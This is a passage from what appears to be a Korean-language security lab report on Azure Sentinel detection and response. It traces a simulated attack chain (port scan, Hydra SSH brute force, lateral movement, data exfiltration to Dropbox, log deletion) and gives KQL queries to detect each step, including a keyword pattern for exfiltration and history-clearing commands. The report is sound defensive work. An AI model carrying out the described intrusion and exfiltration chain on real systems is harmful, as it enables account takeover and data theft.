        *   **결과:** Nginx 설정(`autoindex on`)에 의해 **Directory Listing**이 노출됨을 확인 (의도된 취약점).
    *   **검증 방법:** `curl -I https://www.04www.cloud/phpmyadmin` 실행 시 403 응답 확인.

> [!NOTE] 스크린샷 가이드: Nginx ACL 검증
>     1.  터미널에서 `curl -I https://www.04www.cloud/phpmyadmin` 실행 → 403 응답 화면 캡처.
>     2.  `/backup/` 접근 시 Directory Listing이 노출된 브라우저 화면 캡처.

---

## 5. MITRE ATT&CK 기반 종합 공격 조사 시나리오

단일 위협 탐지를 넘어, 지능형 지속 위협(APT) 관점에서 **"침투 -> 탐색 -> 유출"**로 이어지는 공격의 전 과정을 추적하고 대응하는 모의 훈련을 수행했습니다. 이 시나리오는 기업 내 발생 가능한 **Insider Threat(내부자 위협)** 상황을 가정합니다.

### 5.1 시나리오 개요: 내부 중요 데이터 유출

*   **배경:** 외부 공격자가 취약한 포트 탐색부터 시작하여, 내부망 확산 및 흔적 삭제까지 시도하는 고도화된 APT 공격 시나리오.
*   **Attack Flow (MITRE ATT&CK Kill Chain):**
    1.  **Reconnaissance (T1595):** 외부인(Kali)이 Nmap 스캔을 통해 열려있는 포트(22, 80) 식별.
    2.  **Initial Access (T1110):** 무차별 대입(Brute Force) 공격으로 `www` 계정 패스워드 탈취 및 침투.
    3.  **Discovery (T1046):** 침투한 서버에서 내부 네트워크 대역 스캔 및 DB 서버 탐색.
    4.  **Lateral Movement (T1021):** 탈취한 계정으로 인접 시스템(DB/WAS) 및 관리망 영역으로 접근 시도.
    5.  **Collection & Exfiltration (T1567):** 중요 데이터를 압축(`tar`)하고 외부 클라우드(Dropbox)로 유출.
    6.  **Defense Evasion (T1070):** 발각을 피하기 위해 `bash_history` 등 로그 삭제 시도.

### 5.2 단계별 조사 프로세스 (Investigation)

**Step 1. 정찰 및 침투 (Recon & Initial Access)**
*   **시나리오:** Nmap 스캔 -> Hydra Brute Force -> SSH 접속 성공.
*   **KQL 분석:** `Failed password` 급증 후 `Accepted password` 패턴 탐지.

> [!NOTE] 스크린샷 가이드: 정찰 및 침투
>     1.  Sentinel > Logs에서 SSH Brute Force KQL 실행.
>     2.  'Failed password'가 반복되다가 'Accepted password'가 나타나는 시점의 로그 캡처.

**Step 2. 내부 위협 행위 (Discovery & Lateral Movement)**
*   **시나리오:** 침투 후 `nc`, `ping`으로 내부 IP 스캔 및 타 서버 접속 시도.
*   **KQL 분석:**
    ```csharp
    // 내부망 스캔 및 거부된 트래픽(Lateral Movement 실패) 조회
    AzureDiagnostics
    | where Category == "AzureFirewallNetworkRule" or Category == "AzureFirewallApplicationRule"
    | where Action == "Deny"
    | where SourceIp == "<Web-VM-Private-IP>"
    | project TimeGenerated, SourceIp, DestinationIp, DestinationPort, Action
    ```
    *   **결과:** Web VM에서 DB/관리망으로 향하는 트래픽이 방화벽/NSG에 의해 차단된 로그 확인.

> [!NOTE] 스크린샷 가이드: 내부 확산 시도
>     1.  Sentinel에서 위 방화벽 차단 KQL 실행.
>     2.  Web VM 내부 IP(192.168.1.4 등)에서 다른 내부 IP로 가는 트래픽이 'Deny' 된 로그 캡처.

**Step 3. 데이터 유출 및 흔적 삭제 (Exfiltration & Evasion)**
*   **시나리오:** 중요 파일 압축(`tar`) 및 외부 전송(`curl`), 이후 로그 삭제(`rm`).
*   **Sentinel Alert:** **"Anomalous File Access"**, **"Potential Data Exfiltration"**
*   **KQL 분석:**
    ```csharp
    // 중요 파일 접근, 외부 전송, 로그 삭제 명령어 조회
    Syslog
    | where TimeGenerated > ago(1h)
    | where SyslogMessage has_any ("tar", "zip", "curl", "wget", "rm ", "history -c")
    | project TimeGenerated, Computer, User, SyslogMessage
    ```

> [!NOTE] 스크린샷 가이드: 유출 및 회피 시도
>     1.  위 Syslog 쿼리 실행.
>     2.  `tar`(압축), `curl`(전송), `rm`(삭제) 명령어가 포함된 로그들을 한 화면에 캡처 (공격의 타임라인 증명).

**Step 4. 공격 흐름 시각화 (Investigation Graph)**
*   Sentinel의 조사 도구(Investigation Graph)를 활용하여 엔티티 간 연관성 분석.
*   **연결 고리 확인:** [User: `www`] — [Host: `web-vm`] — [Process: `curl`] — [Dest IP: `Dropbox_IP`]

> [!NOTE] 스크린샷 가이드: Investigation Graph
>     1.  Azure Portal에서 **Microsoft Sentinel** 접속 > **Incidents** 메뉴 클릭.
>     2.  목록에서 인시던트 선택 후 우측 하단 **'Investigate' (조사)** 버튼 클릭.
>     3.  그래프 화면에서 공격자(IP)와 피해 서버(Host)가 연결된 화면 캡처.

**Step 5. 대응 및 차단 (Response)**
1.  **네트워크 격리:** Defender for Cloud의 **'JIT VM Access'**를 강제 회수하여 외부 접속 경로 차단.
2.  **계정 잠금:** 해당 사용자 세션 강제 종료 (`pkill -u www`).
3.  **정책 강화:** 방화벽(Azure Firewall)에 Cloud Storage 관련 도메인 차단 규칙 업데이트.

> [!NOTE] 스크린샷 가이드: 인시던트 대응
>     1.  NSG 규칙에서 공격자 IP를 차단한 화면 캡처 (Azure Portal > NSG > Inbound rules).
>     2.  Firewall 애플리케이션 규칙에 Dropbox 등 클라우드 스토리지 차단 규칙 추가 화면 캡처.

### 5.3 대응 방안 및 시사점

*   **보안 프로세스 정립:** 단순 차단을 넘어, **탐지(Alert) -> 분석(Graph) -> 대응(Response)**으로 이어지는 표준 오퍼레이션 절차(SOP)를 마련함.
*   **개선점:** 데이터 유출 방지(DLP) 솔루션 도입 필요성 및 중요 사용자 행위 분석(UEBA) 규칙 고도화 필요.

---

## 6. 보안 사고 대응 및 자동화 (SOAR)

### 6.1 Action Group 알림 구성

**구성:**
- Sentinel 인시던트 발생 시 Azure Monitor Alert Rule 트리거
- Action Group을 통해 보안 담당자에게 이메일 발송

**수신 이메일 예시:**
```
From: Microsoft Azure <azure-noreply@microsoft.com>
Subject: 🔴 [High Severity] Azure Sentinel Incident - SSH Brute Force

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
INCIDENT DETAILS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• Name: SSH Brute Force Attack
• Severity: High
• Time: 2024-12-11 14:10:05 (KST)
• Status: New

ENTITIES INVOLVED
• Attacker IP: 112.x.x.x
• Target Host: web-vmss_0
• Failed Attempts: 487

RECOMMENDED ACTIONS
1. Block attacker IP in NSG/Firewall
2. Check for successful logins
3. Review target account integrity

[View in Azure Portal]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

> [!NOTE] 스크린샷 가이드: 자동 알림 이메일
> *   **Image:**
>     1.  Outlook 또는 수신 이메일함 접속.
>     2.  발신자가 **'Microsoft Azure'**이고 제목에 **'Azure Sentinel Incident'**가 포함된 메일 클릭.
>     3.  메일 본문의 공격 정보(IP, 시간 등)가 잘 보이도록 펼쳐서 캡처.

### 6.2 보안 사고 조사 및 종결

**사고 대응 타임라인:**

```
14:10:00 ┃ 🔴 공격 개시
         ┃   └─ 공격자가 Hydra 툴로 SSH Brute Force 시작
         │
14:10:45 ┃ 🔍 탐지 (45초 소요)
         ┃   └─ Sentinel이 'Failed password' 패턴 급증 감지
         │
14:11:00 ┃ 📋 분석
         ┃   └─ 인시던트 자동 생성, 엔티티(IP, Host) 매핑
         │
14:11:05 ┃ 📧 알림
         ┃   └─ 보안 담당자 이메일 발송 (자동)
         │
14:13:00 ┃ 🛡️ 대응 (수동)
         ┃   └─ 담당자가 NSG에서 공격자 IP 차단
         │
14:15:00 ┃ ✅ 종결
         ┃   └─ 인시던트 상태 'Closed'로 변경
         
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
총 대응 시간: 5분 (골든 타임 내 대응 완료)
```

> [!NOTE] 스크린샷 가이드: 인시던트 종결
>     1.  **Sentinel > Incidents** 메뉴에서 종결할 인시던트 선택.
>     2.  우측 패널에서 **Status**를 'Closed'로 변경, **Classification**을 'True Positive'로 설정한 화면 캡처.
>     3.  인시던트 목록에서 해당 인시던트가 '✅ Closed' 상태로 변경된 화면 캡처.

### 6.3 위협 인텔리전스 보고서

**현재 상태:** TI 데이터 커넥터 미연결로 인해 실제 TI 지표 수집 및 매칭 검증은 수행하지 못했습니다.

**TI 지표 조회 쿼리 (예시):**
```kusto
ThreatIntelligenceIndicator
| where TimeGenerated > ago(30d)
| summarize 
    TotalIndicators = count(),
    MaliciousIPs = countif(ThreatType == "malicious-ip"),
    Malware = countif(ThreatType == "malware"),
    C2 = countif(ThreatType == "c2")
```

TI 커넥터 연결 시, 위 쿼리로 수집된 위협 지표를 확인하고 방화벽 로그와 교차 분석할 수 있습니다.

---

## 7. 결론

본 **행위기반 보안탐지 및 대응 검증**을 통해, 다음 역량이 확보되었음을 확인했습니다:

| 영역 | 검증 결과 |
|:---|:---|
| **Defender for Cloud** | 클라우드 인프라(VM, SQL, Storage) 위협 탐지 및 권장 사항 제공 |
| **KQL** | 복잡한 위협 헌팅 쿼리 작성 및 다중 테이블 상관관계 분석 |
| **Sentinel** | SSH Brute Force, 권한 상승, WAF 공격, Firewall Deny 등 다양한 위협 탐지 |
| **SOAR** | 5분 이내 탐지→알림→대응 자동화 파이프라인 구축 |

이번 프로젝트를 통해 **탐지(Detection)부터 대응(Response)까지의 전체 보안 관제 사이클**을 성공적으로 구축하였으며, 향후 고도화된 위협 시나리오에도 즉각 대응할 수 있는 기반을 마련했습니다.

---
